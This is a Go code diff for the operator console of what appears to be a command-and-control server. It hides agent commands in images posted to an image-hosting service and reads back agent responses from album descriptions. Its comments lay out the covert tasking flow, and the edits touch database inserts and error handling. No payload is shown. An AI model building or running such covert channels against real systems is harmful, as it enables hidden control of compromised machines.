@@ -3,6 +3,7 @@
 // Display walkthroughs for each module [√]
 // Fix the tasking module since I commented out the upload function
 // Set up mysql and configure it for multiple agent handlings []
+// Make the album go function add to the databse, because right now it only lists the most current album hash and title []
 // Error handling for existing tables and what not [√]
 // Set up tasking module / Database []
 // Fix some of the verbiage on the modules so that it makes a bit more sense []
@@ -10,6 +11,11 @@
 // Add the ability to upload to other albums []
 // Change all the options so that when you type "options" and the value exists, it queries the database and not the global maps []
 // 		--> Eh, I think this is fine, I'll try and see what others think
+
+// Thoughts right now is to have a target upload an encoded image after getting tasking, just not sure if the agent definition should be on response or on tasking
+
+// How this should work:
+// Set up a tasking image for a client -> client grabs it, runs it, uploads new(?) image based on description -> server (C2) is keeping track of each agent and checking for responses (New album for each agent/tasking)
 
 /*
  My thought right now is that this will look for any descriptions that mention the word "response"
@@ -126,21 +132,19 @@ func main() {
 			return
 		}
 
-		//fmt.Printf("You chose %q\n", result)
-
 		if strings.EqualFold(result, "options") {
 			fmt.Println("")
 			fmt.Println(color.YellowString("[ Valid Commands ]	[ Description ]"))
 			fmt.Println("------------------      ---------------") // Literally just aethetic
 			fmt.Println(" ")
-			fmt.Println(" Image		Create an Image for agent tasking")
-			fmt.Println(" Album		Create an Album for agent responses")
-			fmt.Println(" Task		Create Tasking for agent")
-			fmt.Println(" List		List images, albums, agents, and tasks")
-			fmt.Println(" Response	Search for any pending responses within an album")
-			fmt.Println(" Options	List out different options/modules you can choose from")
-			fmt.Println(" Init		Have the server walk you through filling in the options you need")
-			fmt.Println(" Exit		Exit program")
+			fmt.Println(" Image			Create an Image for agent tasking")
+			fmt.Println(" Album			Create an Album for agent responses")
+			fmt.Println(" Task			Create Tasking for agent")
+			fmt.Println(" List			List images, albums, agents, and tasks")
+			fmt.Println(" Response		Search for any pending responses within an album")
+			fmt.Println(" Options		List out different options/modules you can choose from")
+			fmt.Println(" Init			Have the server walk you through filling in the options you need")
+			fmt.Println(" Exit			Exit program")
 			fmt.Println(" ")
 			fmt.Println(color.YellowString("[ The order these should be run in ] "))
 			fmt.Println("------------------------------------") // Literally just aethetic
@@ -204,13 +208,15 @@ func main() {
 					} else if strings.Contains(text, "client-id") {
 						clientID := strings.Split(text, "client-id ")
 						imageOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
+						// This was putting the client-id in row 1, for other modules to grab, but idk how much that makes sense currently, commenting out for now
+						//internal.InsertClientID(imageOptions["ClientID"])
 
 					}
 
 				} else if strings.Contains(text, "go") {
 					cmd.CreateImage(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
 					// Utilizes the mysql stuff, currently have it set up on a Docker test server
-					internal.InsertImages(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
+					internal.InsertImages(imageOptions["ClientID"], imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
 
 				} else if strings.Contains(text, "exit") {
 					break
@@ -220,6 +226,10 @@ func main() {
 		}
 
 		if strings.EqualFold(result, "Album") {
+			// I put this here so that it would initialize this value instantly, but idk if this is the perfect spot
+			if internal.GetClientID() != "" {
+				albumOptions["Client-ID"] = internal.GetClientID()
+			}
 			for {
 				reader := bufio.NewReader(os.Stdin)
 				color.Set(color.FgGreen)
@@ -229,24 +239,12 @@ func main() {
 				initialText, _ := reader.ReadString('\n')
 				text := strings.ToLower(initialText)
 
-				// Check to see if this value was set in the Image module
-				if val, ok := imageOptions["ClientId"]; ok {
-					albumOptions["Client-ID"] = val
-				}
-
-				// Check to see if this value was set in the Image module
-				if val, ok := imageOptions["AlbumId"]; ok {
-					albumOptions["AlbumID"] = val
-				}
-
-				// Check to see if this value was set in the Image module
-				if val, ok := imageOptions["ClientID"]; ok {
-					albumOptions["Client-ID"] = val
-				}
-
 				if strings.TrimRight(text, "\n") == "options" {
 					fmt.Println(" ")
 					fmt.Println(color.YellowString("==[ OPTIONS ]=="))
+
+					// THis did grab the client id from the Picture table which was inserted by simply setting the client-id in the Image module
+					// But if you run go in the image module, it doesn't set the client-id which doesn't make sense, leaving commented out for now
 
 					for key, value := range albumOptions {
 						if value == "" {
@@ -463,7 +461,7 @@ func main() {
 
 					response, e := http.Get(linkImage.(string))
 					if e != nil {
-						log.Fatal(e)
+						log.Print(e)
 					}
 					defer response.Body.Close()
 
@@ -471,14 +469,14 @@ func main() {
 					// Should probably have the user define what and where to call this
 					file, err := os.Create("/tmp/asdf.jpg")
 					if err != nil {
-						log.Fatal(err)
+						log.Print(err)
 					}
 					defer file.Close()
 
 					// Use io.Copy to just dump the response body to the file. This supports huge files
 					_, err = io.Copy(file, response.Body)
 					if err != nil {
-						log.Fatal(err)
+						log.Print(err)
 					}
 					fmt.Println("Get response: Success!")
 					fmt.Println(" ")
@@ -537,7 +535,7 @@ func main() {
 
 			fmt.Println("Adding data to the SQL instance...")
 			// Utilizes the mysql stuff, currently have it set up on a Docker test server
-			internal.InsertImages(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
+			internal.InsertImages(imageOptions["ClientID"], imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
 			fmt.Println("[+] All done! Moving on...")
 			time.Sleep(1 * time.Second)
 
